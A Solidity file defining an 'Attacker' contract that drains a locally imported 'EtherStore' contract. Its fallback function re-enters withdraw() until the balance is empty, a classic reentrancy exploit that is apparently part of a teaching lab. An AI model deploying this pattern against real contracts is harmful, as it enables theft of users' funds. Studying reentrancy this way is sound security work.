// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./EtherStore.sol";

contract Attacker {

    EtherStore public etherStore;
    constructor (address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(etherStore).balance > 0 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        etherStore.deposit{value: 0.1 ether}();
        etherStore.withdraw();
    }
}